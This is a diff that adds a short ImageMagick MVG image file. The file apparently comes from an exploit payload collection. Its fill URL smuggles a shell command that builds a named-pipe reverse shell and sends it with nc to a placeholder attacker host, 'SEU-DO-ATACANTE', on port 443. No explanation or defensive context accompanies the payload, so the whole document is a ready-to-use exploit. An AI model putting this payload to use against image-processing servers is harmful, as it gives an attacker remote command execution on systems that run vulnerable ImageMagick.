@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.png"|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SEU-DO-ATACANTE 443 >/tmp/f")'
+pop graphic-context
